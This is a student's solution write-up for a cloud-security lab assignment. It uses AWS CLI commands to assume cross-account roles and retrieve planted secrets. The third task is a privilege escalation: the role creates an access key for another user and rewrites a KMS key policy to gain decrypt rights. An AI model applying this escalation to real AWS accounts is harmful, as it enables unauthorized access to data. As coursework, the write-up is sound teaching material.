
# Assignment 2: Account Hopping

In addition to the primary `cis21` account (`145214354801`) there is now a second `cis21b` account (`512341796030`). In this account, three secrets are hidden, which you can find:

- The first secret is in the bucket `cis21-secret-1` in the file `secret1.txt`. This one you can directly access from the `cis21` account using the aws CLI.
- The second secret is in the bucket `cis21-secret-2` in the file `secret2.txt`. This bucket can only be accessed directly by assuming the Role `AccessSecret2` in the `cis21b` account.
- Bonus: The third secret is in the bucket .. you guessed it, `cis21-secret-3` in the file `secret3.txt`. You can use the role `AccessSecret3`, for which you need to specify the external ID `cis21`. However, `secret3.txt` is encrypted with a key you don't have access to. Can you still get at the secret?

---

## Solution:
## Task 1
- Every time using the _aws cli_ use `aws-vault exec itsec-cloud -- ` as prefix for each command
- Listing objects in bucket: `aws s3 ls cis21-secret-1`
- Get object from bucket: `aws s3 cp s3://cis21-secret-1/secret1.txt secret1.txt`

## Task 2
- Assume aws role `AccessSecret2` from account `512341796030`: `aws sts assume-role --role-arn "arn:aws:iam::512341796030:role/AccessSecret2" --role-session-name AWSCLI-Session`
- Create environment variables to assume the IAM role and verify access
  1.  Create three environment variables `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` to assume the IAM role. These environment variables are filled out with this output
  2. Verify that you assumed the IAM role by running this command: `aws sts get-caller-identity`
  3. Make that stuff that you want
  4. Unset `unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN`
  5. Verify `aws sts get-caller-identity`
- Get object from bucket: `aws s3 cp s3://cis21-secret-2/secret2.txt secret2.txt`

## Task 3
- Assume aws role `AccessSecret3` from account `512341796030` with external id `cis21`: `aws sts assume-role --role-arn "arn:aws:iam::512341796030:role/AccessSecret3" --role-session-name AWSCLI-Session --external-id cis21`
- Create environment variables to assume the IAM role and verify access
  1.  Create three environment variables `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` to assume the IAM role. These environment variables are filled out with this output
  2. Verify that you assumed the IAM role by running this command: `aws sts get-caller-identity`
  3. Make that stuff that you want
  4. Unset `unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN`
  5. Verify `aws sts get-caller-identity`
- List objects from bucket: `aws s3 ls s3://cis21-secret-3`
- Identify bucket encryption: `aws s3api get-bucket-encryption --bucket cis21-secret-3`
- List kms keys into local file: `aws kms list-keys < kms_keys.json`
- List aliases of kms keys into local file: `aws kms list-aliases > kms_aliases.json`
- Description of SSE-KMS key into local file: `kms describe-key --key-id 13464f1d-dd12-46ff-a8f7-5edd8e3008e1 > kms_describe_key.json`
- List key policies (result: default) : `aws kms list-key-policies --key-id 13464f1d-dd12-46ff-a8f7-5edd8e3008e1`
- Get key policy of given key into local file: `aws kms get-key-policy --key-id 13464f1d-dd12-46ff-a8f7-5edd8e3008e1 --policy-name default --output text > given_key_policy.json`
- List iam roles into local file: `aws iam list-roles > iam_roles.json`
- List iam policies into local file: `aws iam list-policies > iam_policies.json`
- Get policy for role `AccessSecret3` into local file: `aws iam get-role-policy --role-name AccessSecret3 --policy-name AccessSecret3 > role_AccessSecret3_policy.json`
- Create access token for user `ebke+cis21b@hm.edu`: `aws iam create-access-key --user-name ebke+cis21b@hm.edu`
- Adjust key policy with user `ebke+cis21b@hm.edu`: `aws kms put-key-policy --key-id 13464f1d-dd12-46ff-a8f7-5edd8e3008e1 --policy-name default --policy file://new_key_policy.json`
- Get object from bucket with role `AccessSecret3`: `aws s3 cp s3://cis21-secret-3/secret3.txt secret3.txt`

### What was the problem here?
- You can only get acccess to the role `AccessSecret3` from your user account
- The role `AccessSecret3` got a open policy `AccessSecret3`, which can't be edited cause of beeing in another acccount
- There is no given bucket policy for s3 resource `cis21-secret-3` given
- All objects in bucket `cis21-secret-3` are encrypted with a symmetric self-managed kms key
- The only valid actions according to the kms key policy are `List*`, `Get*` and `Describe*` operations
- In order to download the `secret3.txt` within bucket `cis21-secret-3` you need the permissions `s3:GetObject` and `kms:Decrypt`
- Due to this there is a need for a privilige escalaiton, so that the role `AccessSecret3` get permission `kms:Decrypt`
- Only role `OrganizationAccountAccessRole` wehre no access is given and user `ebke+cis21b@hm.edu` can adjust the kms key policy
- Luckily an access token for `ebke+cis21b@hm.edu` can be created within the scope of role `AccessSecret3`
- Afterwards the key policy will be updated, so that role `AccessSecret3` gets permission `kms:Decrypt`
- Now the `secret3.txt` can be successfully be downloaded

---

## Secrets:
- Content of `secret1.txt`: `The password is "swordfish"`
- Content of `secret2.txt`: `May the source be with you.`
- Content of `secret3.txt`: `Congratulations, you made it! The secret pumpkin is under the pink helicopter.`

---

## Important links
- https://awscli.amazonaws.com/v2/documentation/api/latest/index.html
- https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/index.html
- https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html
- https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/index.html
- https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
- https://aws.amazon.com/premiumsupport/knowledge-center/iam-assume-role-cli/
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/default-bucket-encryption.html
- https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/create-access-key.html
- https://docs.aws.amazon.com/cli/latest/reference/kms/put-key-policy.html
- https://aws.amazon.com/premiumsupport/knowledge-center/decrypt-kms-encrypted-objects-s3/
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html
